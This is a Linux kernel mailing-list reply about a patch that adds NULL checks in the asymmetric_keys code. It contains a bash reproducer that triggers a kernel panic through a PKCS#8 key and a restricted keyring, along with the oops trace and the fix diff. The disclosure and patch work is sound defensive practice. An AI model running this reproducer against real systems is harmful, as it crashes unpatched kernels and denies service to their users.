Received: from mail-pg1-f180.google.com (mail-pg1-f180.google.com [209.85.215.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A88611FD4
	for <linux-crypto@vger.kernel.org>; Fri,  1 May 2026 07:48:42 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1777621724; cv=none; b=ANLtx4yf/Z5VQWXCesJX+N9dKh7kAzGR8Z3XgmP5Ex4ZzhtJUhu7K8A1SHF+A9k783wSOR8V+7XVMCbmzVitGCa0kH4xqbF0EKjp4+d6ltji6a34lpI2OwplhsFq7zuANbW7UK74EXazxA7NNr9o8kn08dcosD5MjxFZhAOpuqw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1777621724; c=relaxed/simple;
	bh=jorv6BhiEJqSY1AYP8SpeyhaTzWbsRMCr848qp8b+mo=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=lOSFuYaAcOWGGEK+5hvP8sIEF3nUIJcOLbLV8A/XJRGvowikEwJ8RzXNPljN2AXovE/Yr+n8rlJ5iTHxxjU/HBPRFUD7YIJ5GSL/rQcatTrDwCzKnTCEOnWi0IVoZ6p7+eJz9OY1hiDTsVqZFjEVp2yPSdP/8G3na1Il3Ltfw3o=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=AUzkX87w; arc=none smtp.client-ip=209.85.215.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="AUzkX87w"
Received: by mail-pg1-f180.google.com with SMTP id 41be03b00d2f7-c7961d7bc09so708950a12.1
        for <linux-crypto@vger.kernel.org>; Fri, 01 May 2026 00:48:42 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1777621722; x=1778226522; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=shWjlBvDUojyxeXhI0TjV/bmsRb0s7AbgQKLo8raUF8=;
        b=AUzkX87wlPgLPmIGgqbFjQXFTOi1LUOcZ70ptFkC44GOYe8FcZHKN5mhu7lsBPPSpn
         wOJneNGhlfEg/NeoFrM5p4izutltV4nwl4QHxTZi/iVc6s7v12HJ68R9ccQu+1kvIEVt
         W6Evwd0S8UNmTsY/7qPzIJZxHHmZpUSYdkPfriQMWnu3Gh5v9J08XerIlxYAdrNG4+pF
         PYIh0Oz3vdoIgAcP7FxNK7YJy3kCH0ip1hV87xWeUXqQXk1O35QsWC4hBqa1F+SK8gH2
         kmy/xR6i/p4H1p7QTL45YCYTtAvsyJY5jKxbdDTCo2WYlevqS1A2Qn5CxiQ36BbA4s19
         veaw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1777621722; x=1778226522;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=shWjlBvDUojyxeXhI0TjV/bmsRb0s7AbgQKLo8raUF8=;
        b=c1VJi/Enf72Duq8g/FOZad5ZN6QqVylqRqqNqgWdhuxi2O26rHi85Wg5R0/5KWpJ8E
         Wy39hP7rQJgrMgcOEaQPcSz1MjQaHh5hEUvV+jlK/aRtlqmzvb5A90b0EAEEI+28tanK
         pE6ncuiwnAjDTqVEfiWIZQK5j+viWhtqwxn4Zm1P0VMpfRskQgOI53NvanLHf1t0SCEX
         zUBEIXfROkMqBYVqruyXEmP4pTB0R4hu/50zWQOZ9s+akinLWdYJcRCvw4GhWjXjNQue
         7FJm3gxp9rVvYRJ3zS85gJhrXrLL/vyjCW5B9Q6vpZ37MV/YDNUZAImOf415C8//YPJF
         xcdg==
X-Forwarded-Encrypted: i=1; AFNElJ9kRcv2fpiuI8isP7FDwj/svFLLMu7WAUIN7nzQttu3MIMSBDE/QykXJAyPlmDRTFgmhaeZZHJ3aeOsChQ=@vger.kernel.org
X-Gm-Message-State: AOJu0YzIpm58OgRbUg3vvZn0fEqnnoGcX5ISCvmbGMT0Kogez85u5ZOA
	XiybzRk+mHv/e3UPR7inWDwTPetfql1uut9SUTf3jbFMJ1vNsGZK5uSUXrMCC7m3JPc=
X-Gm-Gg: AeBDiesMYW7O+wUUtfdspMOQHdED/NxsE+n2DrWlybYww+K9MNPopIcn07rqLrviX+M
	OO4Q6sp865/oX0zSd4I+7nVFT7YJFUsa3eDnyfTrYpwMbi0/QtBB6g+TFvJb5Sz0J1xvcF81kE+
	57Vk25EV7xTzZ/VkOGvc+Yf7y2VXl/Ki2oMlHcj6zqKLV3VdGHpIS6VRNo9Ryj6sIowXFCM50og
	Gdu3Eu1jH9tzhbY2AfPLcX7JFbhI3EPezQWW5byQJ8bEkLmCfGe+5zKiWwSOMmI2mRxWP2j8G8k
	WD1vGj8le1jGUlEkoNjhkPydBLYfVcV6Wet3pcGoFPFiqzbWf6g9cXd4tZvQxovhtQzCzJ3COeP
	sZjDwBczQWNSZUaOhJKdEDl1pPEqE+mJtkT4OvqAeJtbrwPWjm0ZHq237x8W1I9/il7f0D5BaGZ
	mTuMHguOhDTxz+kVw7/1aKvAjV6rhfs1dir14+YHPU0gGwdbeKtYJAu7Su/ft42w==
X-Received: by 2002:a05:6a21:339a:b0:38d:fad1:cf2a with SMTP id adf61e73a8af0-3a3cf5fbae5mr8426008637.13.1777621722000;
        Fri, 01 May 2026 00:48:42 -0700 (PDT)
Received: from Air.local ([198.176.50.157])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-83515acff64sm1618697b3a.36.2026.05.01.00.48.38
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 01 May 2026 00:48:41 -0700 (PDT)
Date: Fri, 1 May 2026 15:48:34 +0800
From: Weiming Shi <bestswngs@gmail.com>
To: Ignat Korchagin <ignat@linux.win>, g@air.local
Cc: David Howells <dhowells@redhat.com>, Lukas Wunner <lukas@wunner.de>,
	Herbert Xu <herbert@gondor.apana.org.au>,
	"David S . Miller" <davem@davemloft.net>,
	Jarkko Sakkinen <jarkko@kernel.org>,
	Andrew Zaborowski <andrew.zaborowski@intel.com>,
	keyrings@vger.kernel.org, linux-crypto@vger.kernel.org,
	Xiang Mei <xmei5@asu.edu>
Subject: Re: [PATCH] asymmetric_keys: check asymmetric_key_ids() for NULL
 before dereference
Message-ID: <afRa0lc2A4kHk9at@Air.local>
References: <20260429181629.110802-2-bestswngs@gmail.com>
 <CAOs+rJUiup_B1ve7UztJH4crzE+98ZObRc3jLRsqkhLekpDmxA@mail.gmail.com>
Precedence: bulk
X-Mailing-List: linux-crypto@vger.kernel.org
List-Id: <linux-crypto.vger.kernel.org>
List-Subscribe: <mailto:linux-crypto+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-crypto+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <CAOs+rJUiup_B1ve7UztJH4crzE+98ZObRc3jLRsqkhLekpDmxA@mail.gmail.com>

On 26-05-01 06:37, Ignat Korchagin wrote:
> Hi,
> 
> Thanks for the report.
> 
> On Wed, Apr 29, 2026 at 7:17 PM Weiming Shi <bestswngs@gmail.com> wrote:
> >
> > asymmetric_key_ids() returns key->payload.data[asym_key_ids], which can
> > be NULL for keys parsed by the PKCS#8 parser (pkcs8_parser.c explicitly
> > stores NULL in prep->payload.data[asym_key_ids]).
> >
> > key_or_keyring_common() in restrict.c and find_asymmetric_key() in
> > asymmetric_type.c both dereference this return value without checking
> > for NULL. An unprivileged user can trigger a NULL pointer dereference
> > in key_or_keyring_common() by creating a PKCS#8 key, restricting a
> > keyring with key_or_keyring:<pkcs8_serial>, and adding an X.509 cert
> > to the restricted keyring. CONFIG_PKCS8_PRIVATE_KEY_PARSER=y is
> 
> Could you add a simple bash script for this to the commit message?
> 

Hi Ignat,

Sure, here is a bash reproducer:

```
#!/bin/bash
modprobe pkcs8_key_parser 2>/dev/null
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:1024 \
    -out /tmp/poc.pem 2>/dev/null
openssl pkcs8 -topk8 -nocrypt -in /tmp/poc.pem \
    -outform DER -out /tmp/poc.p8
openssl req -new -x509 -key /tmp/poc.pem -outform DER \
    -out /tmp/poc.der -days 365 -subj "/CN=Test" \
    -addext "subjectKeyIdentifier=hash" \
    -addext "authorityKeyIdentifier=keyid:always" 2>/dev/null
PKCS8_ID=$(keyctl padd asymmetric pkcs8key @s < /tmp/poc.p8)
KR=$(keyctl newring test_kr @s)
keyctl restrict_keyring $KR asymmetric "key_or_keyring:$PKCS8_ID"
keyctl padd asymmetric trigger $KR < /tmp/poc.der
rm -f /tmp/poc.pem /tmp/poc.p8 /tmp/poc.der
```
If you'd prefer it in the commit message I can send a v2.

Thanks,
Weiming Shi


> > required.
> >
> >  Oops: general protection fault, probably for non-canonical address 0xdffffc0000000000
> >  KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
> >  RIP: 0010:key_or_keyring_common (crypto/asymmetric_keys/restrict.c:205 crypto/asymmetric_keys/restrict.c:279)
> >  Call Trace:
> >   <TASK>
> >   __key_create_or_update (security/keys/key.c:884)
> >   key_create_or_update (security/keys/key.c:1021)
> >   __do_sys_add_key (security/keys/keyctl.c:134)
> >   do_syscall_64 (arch/x86/entry/common.c:52 arch/x86/entry/common.c:83)
> >   entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
> >   </TASK>
> >  Kernel panic - not syncing: Fatal exception
> >
> > Add a NULL check in find_asymmetric_key(), mirroring the existing
> > pattern in asymmetric_match_key_ids() and asymmetric_key_describe().
> > In key_or_keyring_common(), skip the trusted key matching when it
> > has no key IDs and fall through to the check_dest path.
> >
> > Fixes: 7d30198ee24f ("keys: X.509 public key issuer lookup without AKID")
> > Reported-by: Xiang Mei <xmei5@asu.edu>
> > Signed-off-by: Weiming Shi <bestswngs@gmail.com>
> > ---
> >  crypto/asymmetric_keys/asymmetric_type.c | 2 ++
> >  crypto/asymmetric_keys/restrict.c        | 9 ++++++---
> >  2 files changed, 8 insertions(+), 3 deletions(-)
> >
> > diff --git a/crypto/asymmetric_keys/asymmetric_type.c b/crypto/asymmetric_keys/asymmetric_type.c
> > --- a/crypto/asymmetric_keys/asymmetric_type.c
> > +++ b/crypto/asymmetric_keys/asymmetric_type.c
> > @@ -109,6 +109,8 @@ struct key *find_asymmetric_key(struct key *keyring,
> >         if (id_0 && id_1) {
> >                 const struct asymmetric_key_ids *kids = asymmetric_key_ids(key);
> >
> > +               if (!kids)
> > +                       goto reject;
> >                 if (!kids->id[1]) {
> >                         pr_debug("First ID matches, but second is missing\n");
> >                         goto reject;
> > diff --git a/crypto/asymmetric_keys/restrict.c b/crypto/asymmetric_keys/restrict.c
> > --- a/crypto/asymmetric_keys/restrict.c
> > +++ b/crypto/asymmetric_keys/restrict.c
> > @@ -243,10 +243,14 @@ static int key_or_keyring_common(struct key *dest_keyring,
> >                         if (IS_ERR(key))
> >                                 key = NULL;
> >                 } else if (trusted->type == &key_type_asymmetric) {
> > +                       const struct asymmetric_key_ids *kids;
> >                         const struct asymmetric_key_id **signer_ids;
> >
> > -                       signer_ids = (const struct asymmetric_key_id **)
> > -                               asymmetric_key_ids(trusted)->id;
> > +                       kids = asymmetric_key_ids(trusted);
> > +                       if (!kids)
> > +                               goto skip_trusted;
> > +
> > +                       signer_ids = (const struct asymmetric_key_id **)kids->id;
> >
> >                         /*
> >                          * The auth_ids come from the candidate key (the
> > @@ -290,6 +294,7 @@ static int key_or_keyring_common(struct key *dest_keyring,
> >                 }
> >         }
> >
> > +skip_trusted:
> >         if (check_dest && !key) {
> >                 /* See if the destination has a key that signed this one. */
> >                 key = find_asymmetric_key(dest_keyring, sig->auth_ids[0],
> > --
> > 2.39.0
> >
> 
> Ignat
